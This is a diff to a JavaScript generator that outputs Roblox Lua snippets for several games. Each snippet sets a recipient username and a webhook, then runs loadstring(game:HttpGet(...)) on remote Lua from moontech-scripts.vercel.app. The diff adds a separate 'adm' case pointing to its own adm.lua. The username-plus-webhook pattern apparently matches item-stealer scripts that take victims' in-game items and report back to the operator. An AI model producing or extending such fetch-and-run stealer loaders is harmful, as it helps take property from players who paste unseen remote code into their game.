@@ -195,11 +195,14 @@
                            `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/petsimx.lua",true))()`;
             break;
           case "mm2":
-          case "adm":
             outputString = `Username = "${username}"\n` +
                            `Webhook = "${webhook}"\n\n` +
                            `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/mm2.lua",true))()`;
             break;
+            case "adm":
+            outputString = `Username = "${username}"\n` +
+                           `Webhook = "${webhook}"\n\n` +
+                           `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/adm.lua",true))()`;
         }
 
         document.getElementById("output").value = outputString;
